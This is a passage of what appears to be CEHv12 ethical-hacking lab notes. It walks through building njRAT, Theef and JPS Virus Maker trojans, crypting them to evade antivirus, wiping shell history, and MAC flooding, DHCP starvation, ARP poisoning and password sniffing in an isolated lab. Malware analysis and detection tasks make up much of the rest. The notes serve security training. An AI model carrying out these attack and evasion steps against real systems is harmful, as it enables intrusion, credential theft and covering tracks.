+# Ctrl+Z
+shred ~/.bash_history &amp;&amp; cat /dev/null &gt; .bash_history &amp;&amp; history -c &amp;&amp; exit
+                    </code></pre>                <p><strong>Hiding Artifacts in Windows and Linux Machines</strong> <span class="tool-tag">attrib / net user / Linux dotfiles</span></p>                <pre><code># Windows (elevated cmd)
+cd C:\Users\Admin\Desktop
+mkdir Test
+dir
+attrib +h +s +r Test
+dir
+attrib -s -h -r Test
+dir
+net user Test /add
+net user Test /active:yes
+net user Test /active:no
+
+# Linux (Parrot)
+cd Desktop
+mkdir Test
+cd Test
+&gt;&gt; Sample.txt
+touch Sample.txt
+touch .Secret.txt
+ls
+ls -al
+                    </code></pre>                <p><strong>Clear Windows Machine Logs using CCleaner</strong> <span class="tool-tag">CCleaner</span></p>                <pre><code># Installer
+E:\CEH-Tools\...\CCleaner\ccsetup591_pro_trial.exe
+# Install -&gt; Run CCleaner -&gt; Start My Trial
+# Health Check -&gt; Start -&gt; Make it better
+# Custom Clean / Registry / Tools available
+                    </code></pre>            </div></section>            <section class="lab-task"><h3>Module 07 — Malware Threats</h3><div class="section-card">                <p><strong>Gain Control over a Victim Machine using the njRAT RAT Trojan</strong> <span class="tool-tag">njRAT v0.7d (Remote Access Trojan)</span></p>                <pre><code># Attacker (Windows 11) - launch njRAT
+E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\njRAT\njRAT v0.7d.exe
+# port: 5552 -&gt; Start
+# Builder: Host 10.10.1.11 ; check Registy StarUp ; Build
+# Save As: Desktop\Test.exe
+
+# Victim (Windows Server 2022) - run delivered server
+# copy Test.exe from CEH-Tools share to Desktop, double-click Test.exe
+
+# Remote Shell command issued from njRAT Manager
+ipconfig /all
+                    </code></pre>                <p><strong>Hide a Trojan using SwayzCryptor and Make it Undetectable to Various Anti-Virus Programs</strong> <span class="tool-tag">VirusTotal / SwayzCryptor (crypter/FUD)</span></p>                <pre><code># Baseline scan
+https://www.virustotal.com  # upload Desktop\Test.exe -&gt; Confirm upload
+
+# Crypt
+E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Crypters\SwayzCryptor\SwayzCryptor.exe
+# File -&gt; Desktop\Test.exe ; check Start up, Mutex, Disable UAC ; Encrypt
+# Save as Desktop\CryptedFile.exe (default name)
+
+# Rescan
+# VirusTotal -&gt; upload icon -&gt; Desktop\CryptedFile.exe -&gt; Confirm upload
+
+# Verify functionality
+E:\CEH-Tools\...\njRAT\njRAT v0.7d.exe  # port 5552 Start
+# copy CryptedFile.exe to CEH-Tools share
+# Windows Server 2022: copy CryptedFile.exe to Desktop, double-click
+                    </code></pre>                <p><strong>Create a Trojan Server using Theef RAT Trojan</strong> <span class="tool-tag">Theef RAT (port 9871)</span></p>                <pre><code># Victim (Windows Server 2022)
+Z:\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\Theef\Server210.exe
+# (Run on security warning)
+
+# Attacker (Windows 11)
+E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans (RAT)\Theef\Client210.exe
+# IP: 10.10.1.22 ; Port/FTP default ; Connect
+                    </code></pre>                <p><strong>Create a Virus using the JPS Virus Maker Tool and Infect the Target System</strong> <span class="tool-tag">JPS Virus Maker 4.0</span></p>                <pre><code># Create virus (Windows 11)
+E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Virus Maker\JPS Virus Maker\jps.exe
+# Options: Auto Startup; Disable TaskManager, Disable Windows Update, Disable Control Panel,
+# Disable Drives, Hide Windows Clock, Hide Desktop Icons, Enable Remote Desktop,
+# Remove Bluetooth, Turn Off Windows Firewall, Turn Off Windows Defender, Auto Startup
+# Trigger: None
+# Virus Options: Change Windows Password = qwerty ; Change Computer Name = Test
+# Enable Convert to Worm: Worm Name fedevi ; Copy After 1 (sec)
+# Icon: JPG Icon ; trigger None
+# Create Virus! -&gt; drop-down x86(32Bit) -&gt; Create Virus!
+# Output: E:\CEH-Tools\...\JPS Virus Maker\Server.exe
+
+# Infect (Windows Server 2019)
+Z:\CEHv12 Module 07 Malware Threats\Virus Maker\JPS Virus Maker\Server.exe
+                    </code></pre>                <p><strong>Perform Malware Scanning using Hybrid Analysis</strong> <span class="tool-tag">Hybrid Analysis (online)</span></p>                <pre><code># URL
+https://www.hybrid-analysis.com
+# Upload: E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Viruses\tini.exe
+# Email + comment ; accept Terms &amp; Conditions and I&#x27;m not a robot ; Continue
+# Select Windows 11 64 bit -&gt; Generate Public Report
+# MetaDefender: click More Details
+                    </code></pre>                <p><strong>Perform a Strings Search using BinText</strong> <span class="tool-tag">BinText</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\String Searching Tools\BinText\bintext.exe
+# Browse -&gt; E:\CEH-Tools\...\Viruses\Klez Virus Live!\face.exe -&gt; Open
+# Advanced view checked -&gt; Go
+                    </code></pre>                <p><strong>Identify Packaging and Obfuscation Methods using PEid</strong> <span class="tool-tag">PEid</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\PEid\PEiD.exe
+# Browse -&gt; E:\CEH-Tools\...\Viruses\Klez Virus Live!\face.exe -&gt; Open
+                    </code></pre>                <p><strong>Analyze ELF Executable File using Detect It Easy (DIE)</strong> <span class="tool-tag">Detect It Easy (DIE)</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE\die.exe
+# Open File - Security Warning -&gt; Run
+# ellipses next to File name -&gt; E:\CEH-Tools\...\Viruses\ELF Test File -&gt; Open
+# File info ; Hash ; Entropy ; Close
+                    </code></pre>                <p><strong>Find the Portable Executable (PE) Information of a Malware Executable File using PE Explorer</strong> <span class="tool-tag">PE Explorer</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\PE Extraction Tools\PE Explorer\PE.Explorer_setup.exe
+# install; Launch PE Explorer checked; View User&#x27;s Guide unchecked; Finish
+# File -&gt; Open File (or drag-drop) -&gt; E:\CEH-Tools\...\Viruses\Klez Virus Live!\face.exe -&gt; Open
+# Evaluation pop-up -&gt; Continue
+# HEADERS INFO ; Data Directories icon ; Section Headers icon ; double-click section
+                    </code></pre>                <p><strong>Identify File Dependencies using Dependency Walker</strong> <span class="tool-tag">Dependency Walker (depends.exe)</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\File Dependency Checking Tools\Dependency Walker\depends.exe
+# File -&gt; Open -&gt; E:\CEH-Tools\...\Viruses\Klez Virus Live!\snoopy.exe -&gt; Open
+# error pop-up -&gt; OK
+# shrink .DLL nodes; select KERNEL32.DLL -&gt; view Import/Export
+                    </code></pre>                <p><strong>Perform Malware Disassembly using IDA and OllyDbg</strong> <span class="tool-tag">IDA Freeware 7.7 / OllyDbg</span></p>                <pre><code># IDA
+# Search icon on Desktop -&gt; type ida -&gt; IDA Freeware -&gt; Open
+# I Agree ; telemetry uncheck Yes... -&gt; OK
+# Quick start -&gt; New
+# Select file -&gt; E:\CEH-Tools\...\Viruses\Klez Virus Live!\face.exe -&gt; Open
+# Load a new file: Portable executable for 80386 (PE) [pe64.dll] -&gt; OK
+# (Warning/Please confirm -&gt; OK/Yes)
+# right-click -&gt; Text view
+# copy qwingraph.exe to C:\Program Files\IDA Freeware 7.7 (Continue on access denied)
+# View -&gt; Graphs -&gt; Flow chart ; View -&gt; Graphs -&gt; Function calls
+# HexView-1 tab ; Structures tab ; Enums tab
+# Save database -&gt; OK
+
+# OllyDbg
+E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\OllyDbg\OLLYDBG.EXE
+# (Run on security warning; UDD Directory Absent -&gt; OK; admin rights -&gt; OK)
+# File -&gt; Open -&gt; E:\CEH-Tools\...\Viruses\tini.exe -&gt; Open
+# View -&gt; Log ; View -&gt; Executable modules ; (double-click module)
+# View -&gt; Memory ; View -&gt; Threads
+                    </code></pre>                <p><strong>Perform Malware Disassembly using Ghidra</strong> <span class="tool-tag">Ghidra</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Disassembling and Debugging Tools\Ghidra\ghidraRun.bat
+# Tip of the Day -&gt; Close
+# File -&gt; New Project... -&gt; Non-Shared Project -&gt; Next
+# Project Name: Malware Analysis -&gt; Finish
+# File -&gt; Import File... -&gt; E:\CEH-Tools\...\Viruses\Klez Virus Live!\face.exe -&gt; Select File to Import -&gt; OK
+# Import Results Summary -&gt; OK ; double-click Face.exe node
+# Analyze pop-up -&gt; Yes ; Analyze Options default -&gt; Analyze
+# Symbol Tree: expand Imports ; Program Tree: double-click Headers, .rdata
+                    </code></pre>                <p><strong>Perform Port Monitoring using TCPView and CurrPorts</strong> <span class="tool-tag">TCPView / CurrPorts / njRAT</span></p>                <pre><code># Build (Windows 11)
+E:\CEH-Tools\...\njRAT\njRAT v0.7d.exe  # port 5552 Start
+# Builder: Host 10.10.1.11 ; Registy StarUp ; ExeName Trojan.exe ; Build
+# Save As: E:\CEH-Tools\...\njRAT\Trojan.exe
+
+# Victim run (Windows Server 2022)
+Z:\CEH-Tools\...\njRAT\Trojan.exe
+
+# TCPView
+Z:\CEH-Tools\...\Port Monitoring Tools\TCPView\Tcpview.exe  # Yes on UAC; Agree
+# search Trojan.exe ; right-click -&gt; Kill Process... -&gt; Cancel
+
+# CurrPorts
+Z:\CEH-Tools\...\Port Monitoring Tools\CurrPorts\cports.exe
+# search Trojan.exe ; Properties ; Kill/Close -&gt; No
+                    </code></pre>                <p><strong>Perform Process Monitoring using Process Monitor</strong> <span class="tool-tag">Process Monitor (Procmon)</span></p>                <pre><code>Z:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Process Monitoring Tools\ProcessMonitor\Procmon.exe
+# Agree license
+# find Trojan.exe ; if killed re-run:
+Z:\CEH-Tools\...\njRAT\Trojan.exe
+# right-click Trojan.exe -&gt; Properties -&gt; Event/Process/Stack tabs -&gt; Close
+                    </code></pre>                <p><strong>Perform Registry Monitoring using Reg Organizer</strong> <span class="tool-tag">Reg Organizer</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Registry Monitoring Tools\Reg Organizer\reg-organizer-setup.exe
+# Run on security warning; Yes on UAC; Next; install; uncheck Enable functions requiring data transfer &amp; What&#x27;s new; Finish
+# TOOLS -&gt; Registry Snapshots -&gt; Create Snapshot -&gt; name &quot;Shot 1&quot; -&gt; OK
+# install SoftPerfect Network Scanner:
+E:\CEH-Tools\CEHv12 Module 04 Enumeration\SNMP Enumeration Tools\SoftPerfect Network Scanner\netscan_setup.exe
+# Compare with Current Registry -&gt; Revealed Differences
+                    </code></pre>                <p><strong>Perform Windows Services Monitoring using Windows Service Manager (SrvMan)</strong> <span class="tool-tag">SrvMan (Windows Service Manager)</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Windows Services Monitoring Tools\Windows Service Manager (SrvMan)\x64\srvman.exe
+# Yes on UAC
+# view services; Properties; Start/Stop/Restart/Add/Delete service
+                    </code></pre>                <p><strong>Perform Startup Program Monitoring using Autoruns for Windows and WinPatrol</strong> <span class="tool-tag">Autoruns for Windows / WinPatrol</span></p>                <pre><code># Autoruns
+E:\CEH-Tools\...\Windows Startup Programs Monitoring Tools\Autoruns for Windows\Autoruns.exe
+# Agree license; view tabs: Logon, Explorer, Services, Drivers, Known DLLs
+
+# WinPatrol
+E:\CEH-Tools\...\Windows Startup Programs Monitoring Tools\WinPatrol\wpsetup.exe
+# Yes on UAC; install; Start application checked; Finish
+# Startup Programs tab: select OneDrive -&gt; Disable
+# IE Helpers: select Java(tm) Plug-In SSV Helper -&gt; Remove (Yes)
+# Services: select -&gt; Info... -&gt; Disabled -&gt; Apply -&gt; Close
+# File Types: select -&gt; Info... -&gt; Expand Info
+# Active Tasks: select -&gt; Kill Task
+                    </code></pre>                <p><strong>Perform Installation Monitoring using Mirekusoft Install Monitor</strong> <span class="tool-tag">Mirekusoft Install Monitor</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Installation Monitoring Tools\Mirekusoft Install Monitor\SetupInstallMonitor.exe
+# Update Available -&gt; Update; Yes on UAC; install; Launch
+# Welcome -&gt; OK; Home -&gt; Skip scan
+# Programs tab: select WinPatrol -&gt; Uninstall -&gt; (WinPatrol pop-ups Yes) -&gt; OK
+# Cleanup for WinPatrol -&gt; OK -&gt; Confirm Cleanup -&gt; Cleanup
+# Performance tab: select program -&gt; End Program
+# Startup tab: select -&gt; Disable
+                    </code></pre>                <p><strong>Perform Files and Folder Monitoring using PA File Sight</strong> <span class="tool-tag">PA File Sight (Ultra/Satellite)</span></p>                <pre><code># Windows 11 (central)
+E:\CEH-Tools\...\Files and Folder Monitoring Tools\PA File Sight\FileSight_Trial_Key_E71BE154-2386-4CF3-BEA3-75830C985736.exe
+# Run on security warning; Yes on UAC; install; Ultra selected; Install Trial License; OK
+# Start service + Launch console checked; Finish
+# Local host -&gt; OK ; close Start Wizard if appears
+# Add New Monitor -&gt; File Sight Monitor -&gt; OK
+# Browse path: C:\Users\Administrator\Desktop\File Monitoring (on Server2022)
+# Monitor Purpose: Audit file activity ; Actions -&gt; New -&gt; Action List -&gt; OK -&gt; Add -&gt; OK
+# File Activities: Existing file is written to; Ignore file appends; OK
+# select Watch node -&gt; Apply ; right-click -&gt; Run Now!
+
+# Windows Server 2022 (satellite)
+Z:\CEH-Tools\...\PA File Sight\FileSight_Trial_Key_....exe
+# Select Components: uncheck Central Monitoring Service and Console UI; check Satellite Monitoring Service
+# Start Satellite Service + Configure checked; Finish
+# Configure Satellite: Central monitoring service address 10.10.1.11:8000 ; Apply Settings
+# Stop Satellite Service ; Start Satellite Service ; Exit
+# Create Desktop\File Monitoring\File Monitoring folder; Secret.txt with text
+                    </code></pre>                <p><strong>Perform Device Driver Monitoring using DriverView and Driver Reviver</strong> <span class="tool-tag">DriverView / Driver Reviver</span></p>                <pre><code>E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Device Drivers Monitoring Tools\DriverView\DriverView.exe
+# right-click driver -&gt; Properties -&gt; OK
+
+E:\CEH-Tools\...\Device Drivers Monitoring Tools\Driver Reviver\DriverReviverSetup.exe
+# Yes on UAC; Next; install; scan; Update All if outdated
+# Home tab: system details; Backup tab: backup/restore
+# Uninstall via Control Panel -&gt; Programs -&gt; Uninstall a program
+                    </code></pre>                <p><strong>Perform DNS Monitoring using DNSQuerySniffer</strong> <span class="tool-tag">DNSQuerySniffer</span></p>                <pre><code>Z:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\DNS Monitoring Tools\DNSQuerySniffer\DNSQuerySniffer.exe
+# Capture Options: WinPcap Packet Capture Driver; select Ethernet adapter; OK
+# wait ~5 min
+# change DNS: Network icon -&gt; Open Network &amp; Internet settings
+# Change adapter options -&gt; Ethernet Properties -&gt; IPv4 Properties
+# Preferred DNS server = 10.10.1.11 ; OK ; Close
+# wait ~5 min; right-click changed log -&gt; Properties -&gt; OK
+# restore Preferred DNS = 8.8.8.8
+                    </code></pre>            </div></section>            <section class="lab-task"><h3>Module 08 — Sniffing</h3><div class="section-card">                <p><strong>Perform MAC Flooding using macof</strong> <span class="tool-tag">macof (dsniff) / Wireshark</span></p>                <pre><code># Parrot Security - become root
+sudo su
+# password: toor (not visible while typing)
+cd
+# jump to root directory
+
+# Launch Wireshark (GUI): Applications -&gt; Pentesting -&gt; Information Gathering -&gt; wireshark
+# Security pop-up: password toor -&gt; OK
+# Wireshark Network Analyzer: double-click available ethernet/interface (eth0) to start capture
+# Leave Wireshark running
+
+# Flood CAM table with 10 random MAC/IP pairs
+macof -i eth0 -n 10
+# -i: specifies the interface
+# -n: specifies the number of packets to be sent (here, 10)
+
+# Target a single system instead
+macof -i eth0 -d [Target IP Address]
+# -d: specifies the destination IP address
+</code></pre>                <p><strong>Perform a DHCP Starvation Attack using Yersinia</strong> <span class="tool-tag">Yersinia / Wireshark</span></p>                <pre><code># Parrot Security - become root
+sudo su
+# password: toor
+cd
+
+# Launch Wireshark (GUI): Applications -&gt; Pentesting -&gt; Information Gathering -&gt; wireshark
+# Security pop-up: password toor -&gt; OK
+# Wireshark Network Analyzer: double-click available ethernet/interface (eth0) to start capture
+# Leave Wireshark running
+
+# Open MATE Terminal, sudo su (toor), cd root
+# Maximize the terminal window (interactive mode only works maximized)
+
+# Open Yersinia in interactive ncurses mode
+yersinia -I
+# -I: Starts an interactive ncurses session
+
+# Yersinia interactive UI steps:
+# Press any key to remove Notification window, then press h for help
+# Press q to exit help options
+# Press F2 to select DHCP mode (STP Fields become DHCP Fields)
+# Press x to list available attack options
+# Press 1 to start a DHCP starvation attack
+# After a few seconds, press q to stop the attack and terminate Yersinia
+</code></pre>                <p><strong>Perform ARP Poisoning using arpspoof</strong> <span class="tool-tag">arpspoof (dsniff) / Wireshark</span></p>                <pre><code># Parrot Security - become root
+sudo su
+# password: toor
+cd
+
+# Launch Wireshark (GUI): Applications -&gt; Pentesting -&gt; Information Gathering -&gt; wireshark
+# Security pop-up: password toor -&gt; OK
+# Wireshark Network Analyzer: double-click available ethernet/interface (eth0) to start capture
+# Leave Wireshark running
+
+# Inform access point that target (10.10.1.11) has our MAC
+arpspoof -i eth0 -t 10.10.1.1 10.10.1.11
+# -i: specifies network interface
+# -t: specifies target IP address
+# Press CTRL+Z after sending a few packets
+
+# Inform target that we are the access point (10.10.1.1)
+arpspoof -i eth0 -t 10.10.1.11 10.10.1.1
+# Press CTRL+Z after sending a few packets
+</code></pre>                <p><strong>Perform a Man-in-the-Middle (MITM) Attack using Cain &amp; Abel</strong> <span class="tool-tag">Cain &amp; Abel</span></p>                <pre><code># Windows Server 2022 - victim generates FTP traffic
+ftp 10.10.1.11
+# When prompted for User: Jason
+# When prompted for Password: qwerty
+# (Irrespective of successful login, Cain captures the password)
+
+# Cain &amp; Abel (Windows Server 2019) GUI steps:
+# Click Type here to search -&gt; type cain -&gt; click Cain
+# Configure (menu bar) -&gt; Sniffer tab -&gt; ensure Adapter for machine IP selected -&gt; OK
+# Start/Stop Sniffer icon -&gt; OK on Warning pop-up
+# Sniffer tab -&gt; plus (+) icon or right-click -&gt; Scan MAC Addresses
+#   MAC Address Scanner: check &quot;All hosts in my subnet&quot;, check &quot;All Tests&quot; -&gt; OK
+# APR tab (bottom) -&gt; click topmost section to activate plus (+)
+#   New ARP Poison Routing: select 10.10.1.11 (left) and 10.10.1.22 (right) -&gt; OK
+# Select created target IP scan in Configuration/Routes Packets tab
+# Start/Stop APR icon -&gt; Status changes Idle to Poisoning
+# Passwords tab (bottom) -&gt; FTP (left pane) to view sniffed password
+</code></pre>                <p><strong>Spoof a MAC Address using TMAC and SMAC</strong> <span class="tool-tag">TMAC v6 / SMAC 2.7</span></p>                <pre><code># TMAC (Windows 11 GUI)
+# Click Search icon on Desktop -&gt; type TMAC -&gt; TMAC v6 -&gt; Open (UAC Yes)
+# Technitium MAC Address Changer pop-up -&gt; click No
+# In TMAC main window: choose network adapter (Ethernet)
+# Information tab: note Original MAC Address
+# Change MAC Address: click &quot;Random MAC Address&quot; -&gt; random MAC appears
+# Click &quot;Change Now!&quot; -&gt; &quot;MAC Address Changed Successfully&quot; -&gt; OK
+# Observe new MAC under Active MAC Address
+# To restore: click &quot;Restore Original&quot; -&gt; &quot;MAC Address Restored Successfully&quot; -&gt; OK
+# Close TMAC
+
+# SMAC (Windows 11 GUI)
+# Click Search icon -&gt; type SMAC -&gt; SMAC 2.7 -&gt; Open (UAC Yes)
+# SMAC License Agreement -&gt; I Accept
+# SMAC Registration -&gt; Proceed (unregistered)
+# Choose network adapter whose MAC is to be spoofed
+# Click &quot;Random&quot; -&gt; random MAC in &quot;New Spoofed MAC Address&quot;
+# &quot;&gt;&gt;&quot; under Network Connection toggles connection/adapter info; &quot;&lt;&lt;&quot; toggles back
+# &quot;&gt;&gt;&quot; under Hardware ID toggles Hardware/Config ID; &quot;&lt;&lt;&quot; toggles back
+# &quot;IPConfig&quot; button -&gt; view ipconfig -&gt; Close
+# &quot;MAC List&quot; -&gt; &quot;Load List&quot; -&gt; select Sample_MAC_Address_List.txt -&gt; Open
+# Choose any MAC address -&gt; &quot;Select&quot; -&gt; appears in New Spoofed MAC Address
+# Click &quot;Update MAC&quot; -&gt; Yes (temp disconnect) -&gt; &quot;Adapter Restart Complete&quot; -&gt; OK
+# Observe new MAC under Spoofed/Active MAC Address
+# To restore: click &quot;Remove MAC&quot;
+</code></pre>                <p><strong>Spoof a MAC Address of Linux Machine using macchanger</strong> <span class="tool-tag">macchanger</span></p>                <pre><code># Parrot Security - become root
+sudo su
+# password: toor
+cd
+
+# Turn off the network interface before changing MAC
+ifconfig eth0 down
+
+# View macchanger options
+macchanger --help
+
+# View current MAC address
+macchanger -s eth0
+# -s: prints the MAC address of the machine
+
+# Set a random vendor MAC address
+macchanger -a eth0
+# -a: sets random vendor MAC address to the network interface
+
+# Set a random MAC address
+macchanger -r eth0
+
+# Enable the network interface
+ifconfig eth0 up
+
+# Verify changed MAC
+ifconfig
+</code></pre>                <p><strong>Perform Password Sniffing using Wireshark</strong> <span class="tool-tag">Wireshark / Remote Packet Capture Protocol v.0</span></p>                <pre><code># Wireshark capture on host (Windows Server 2019)
+# Launch Wireshark (search wireshark) -&gt; double-click Ethernet2 to start capture
+# Victim (Windows 11) browses http://www.moviescope.com and logs in (sam / test)
+# Stop capture -&gt; File -&gt; Save As... -&gt; name &quot;Password Sniffing&quot;
+# Display filter:
+http.request.method == POST
+# Edit -&gt; Find Packet...:
+#   Display filter -&gt; String
+#   Packet list -&gt; Packet details
+#   Narrow &amp; Wide -&gt; Narrow (UTF-8 / ASCII)
+#   search string: pwd -&gt; Find
+# Expand &quot;HTML Form URL Encoded: application/x-www-form-urlencoded&quot; to view username/password
+
+# Remote capture setup (victim Windows 11 must run rpcapd)
+# RDP from Windows Server 2019 to 10.10.1.11 as Jason (password qwerty)
+# Control Panel -&gt; System and Security -&gt; Windows Tools -&gt; Services
+# &quot;Remote Packet Capture Protocol v.0 (experimental)&quot; -&gt; right-click -&gt; Start (Status Running)
+# Close all windows on victim and close RDP
+
+# Wireshark remote interface (Windows Server 2019)
+# Capture options icon -&gt; Manage Interfaces... -&gt; Remote Interfaces tab -&gt; Add (+)
+# Host: 10.10.1.11 ; Port: 2002
+# Authentication: Password -&gt; Jason / qwerty -&gt; OK
+# Select remote interface -&gt; Start
+# Victim (Windows 11) logs in as Jason (qwerty) and browses http://www.goodshopping.com
+</code></pre>                <p><strong>Analyze a Network using the Omnipeek Network Protocol Analyzer</strong> <span class="tool-tag">Omnipeek (LiveAction)</span></p>                <pre><code># Windows 11 browser - register &amp; download Omnipeek
+https://www.liveaction.com/products/omnipeek-network-protocol-analyzer/
+# Click Free Trial; Warning: Potential Security Risk Ahead -&gt; Advanced -&gt; Accept the Risk and Continue
+# Redirected to cart -&gt; checkout
+# LiveAction Store: input personal details; click &quot;Start My Omnipeek Trial&quot;
+# (must provide professional EMAIL ADDRESS work/school)
+# Let&#x27;s get started page: License Key + download link
+# Click &quot;Download Omnipeek for Windows&quot;; if Opening Omnipeek_21.4.1msi pop-up -&gt; Save File
+# Navigate to download location (Downloads) -&gt; double-click Omnipeek_21.4.1msi (version may differ)
+# Open File - Security Warning -&gt; Run
+# OmniPeek Installer: Next
+# Product Activation: Automatic (requires Internet) -&gt; Next
+# Customer Information: Company Name (abc), Email (provided at registration)
+#   switch to Firefox, copy License Key, close browser; paste in Serial Number/Product Key -&gt; Next
+# Follow wizard defaults; UAC Yes if prompted
+# Completing: uncheck View Readme, ensure Launch Omnipeek checked -&gt; Finish (UAC Yes)
+# Omnipeek evaluation dialog -&gt; OK
+
+# Capture (Omnipeek main window)
+# New Capture -&gt; Adapter -&gt; expand &quot;Local machine: WINDOWS11&quot; -&gt; select Ethernet -&gt; OK
+# Start Capture (top right) -&gt; Stop Capture toggles
+# Packets (Capture section, left pane) -&gt; Show Decode View / Show Hex View
+# Events (Capture section)
+# Clients/Servers (Expert section)
+# Flows and Applications
+# Clients (Web section)
+# Peer Map (Visuals section) -&gt; Traffic Types (Unicast, Multicast, Broadcast)
+# Graphs (Visuals section)
+# Summary (Statistics section)
+# File -&gt; Save Report... -&gt; Report folder ellipsis -&gt; Desktop -&gt; OK -&gt; Save
+</code></pre>                <p><strong>Analyze a Network using the SteelCentral Packet Analyzer</strong> <span class="tool-tag">SteelCentral Packet Analyzer Plus (Riverbed)</span></p>                <pre><code># Windows 11 browser - trial registration
+https://www.riverbed.com/trial-downloads
+# Scroll down -&gt; click LEARN MORE under &quot;Try Alluvio AppResponse/Packet Analyzer Plus Trial&quot;
+# (tool version may differ; at bottom click Accept All Cookies)
+# Registration form -&gt; fill personal details -&gt; SUBMIT (must give work email)
+# &quot;Please verify your email address&quot; pop-up -&gt; CONFIRM
+# Thank You webpage with trial info
+# Open new tab -&gt; log in to email -&gt; open &quot;Riverbed Evaluation License Request for SteelCentral PacketAnalyzer Plus&quot;
+#   -&gt; click Software link to download SteelCentral Packet Analyzer
+# Opening PacketAnalyzer_11.13.0_Setup.exe -&gt; Save File
+# Navigate to Downloads -&gt; double-click PacketAnalyzer_11.13.0_Setup.exe
+# Open File - Security Warning -&gt; Run
+# SteelCentral Packet Analyzer Plus Setup: check &quot;Create shortcut on desktop&quot;, click &quot;I Agree&quot;
+# Completing wizard: ensure &quot;Start the application&quot; checked -&gt; Close
+# License window: leave running
+# Switch to browser tab with Riverbed email -&gt; copy License Key
+# License window: paste License Key in Product Key -&gt; Activate (UAC Yes) -&gt; Start
+# Main window shows Getting Started tab
+# (Live Devices unavailable: insufficient privileges) -&gt; double-click prompt -&gt; UAC Yes
+# Ethernet adapter appears under Local System -&gt; click Microsoft Corporation adapter
+# Double-click &quot;Bandwidth Over Time&quot; (Recently Used) -&gt; starts capture
+# Windows Server 2019 browses www.gmail.com
+# Double-click &quot;Network Usage by Port Name&quot; (Recently Used)
+# Double-click &quot;IP Conversations&quot; (Recently Used)
+# Double-click &quot;Protocol Distribution&quot; (Recently Used)
+# Expand Generic -&gt; double-click &quot;Capture Summary&quot;
+# Expand LAN/Network -&gt; double-click &quot;MAC Overview&quot;
+# Explore VLAN, MPLS, ARP, ICMP, DHCP nodes
+# Reporting (menu bar) -&gt; All Views -&gt; export report -&gt; opens in Chrome
+</code></pre>                <p><strong>Detect ARP Poisoning and Promiscuous Mode in a Switch-Based Network</strong> <span class="tool-tag">Cain &amp; Abel / Wireshark / Nmap (sniffer-detect NSE)</span></p>                <pre><code># Parrot Security - generate traffic for poisoning detection
+sudo su
+# password: toor
+cd
+hping3 [Target IP Address] -c 100000
+# here target IP address is 10.10.1.11 (Windows 11)
+# -c: specifies the packet count
+
+# Cain &amp; Abel (Windows Server 2019) GUI:
+# Configure -&gt; Sniffer tab -&gt; select adapter for machine IP -&gt; OK
+# Start/Stop Sniffer -&gt; OK on Warning
+# Sniffer tab -&gt; + (Scan MAC Addresses) -&gt; Range 10.10.1.1-10.10.1.30, All Tests -&gt; OK
+# APR tab -&gt; + (New ARP Poison Routing) -&gt; select 10.10.1.11 (left) and 10.10.1.13 (right) -&gt; OK
+# Select created scan -&gt; Start/Stop APR (Status: Poisoning)
+
+# Wireshark (Windows Server 2019) preferences &amp; capture
+# Edit -&gt; Preferences... -&gt; Protocols node -&gt; ARP/RARP
+#   Check &quot;Detect ARP request storms&quot; and &quot;Detect duplicate IP address configuration&quot; -&gt; OK
+# Double-click adapter (Ethernet2) to start capture
+# Analyze -&gt; Expert Information -&gt; expand Warning &quot;Duplicate IP address configured (10.10.1.11)&quot;
+# Click packet (e.g., 138) to highlight; close Expert Information
+
+# Nmap (Windows 11 Zenmap) promiscuous mode detection
+# Search zenmap -&gt; open &quot;Nmap - Zenmap GUI&quot;
+nmap --script=sniffer-detect [Target IP Address/IP Address Range]
+# here target IP address is 10.10.1.19 (Windows Server 2019)
+# Results show &quot;Likely in promiscuous mode&quot; under Host script results
+</code></pre>                <p><strong>Detect ARP Poisoning using the Capsa Network Analyzer</strong> <span class="tool-tag">Capsa Enterprise (Colasoft) / Habu</span></p>                <pre><code># Windows 11 browser - download Capsa Enterprise
+https://www.colasoft.com/download/arp_flood_arp_spoofing_arp_poisoning_attack_solution_with_capsa.php
+# Download Free Trial -&gt; redirected to Download Capsa Enterprise Trial
+# Scroll down, fill personal details -&gt; &quot;30-Day Trial Download&quot; (professional email)
+# Opening capsa_ent_15.1.0.15104_x64.zip -&gt; Save File (~5 min)
+# Downloads folder -&gt; right-click zip -&gt; WinRAR -&gt; Extract Here
+# Double-click capsa_ent_15.1.0.15104_x64.exe -&gt; UAC Yes
+# Setup - Colasoft Capsa Enterprise: Next -&gt; follow wizard defaults
+# Completing wizard: ensure Launch Program checked -&gt; Finish
+# Colasoft Software Activation Wizard: Next
+# Leave activation wizard open; open browser new tab -&gt; log in to email
+#   Open email from service@colasoft.com -&gt; copy Trial Serial Number
